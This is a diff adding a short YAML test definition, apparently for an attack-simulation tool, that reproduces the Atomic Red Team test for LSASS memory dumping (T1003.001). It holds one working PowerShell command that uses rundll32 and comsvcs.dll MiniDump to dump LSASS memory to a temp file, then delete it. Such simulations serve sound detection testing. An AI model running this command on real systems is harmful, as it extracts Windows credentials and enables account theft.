@@ -1,0 +1,12 @@
+# Atomic Red Team T1003.001 — "Dump LSASS.exe Memory using comsvcs.dll"
+id: bas-001
+name: LSASS memory dump via comsvcs MiniDump
+techniques: [T1003.001]
+target: windows-endpoint
+executor:
+  platform: windows
+  command: >-
+    powershell.exe -NoProfile -Command
+    "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump
+    (Get-Process lsass).Id C:\Windows\Temp\ares-bas-lsass.dmp full;
+    Remove-Item C:\Windows\Temp\ares-bas-lsass.dmp -Force -ErrorAction SilentlyContinue"
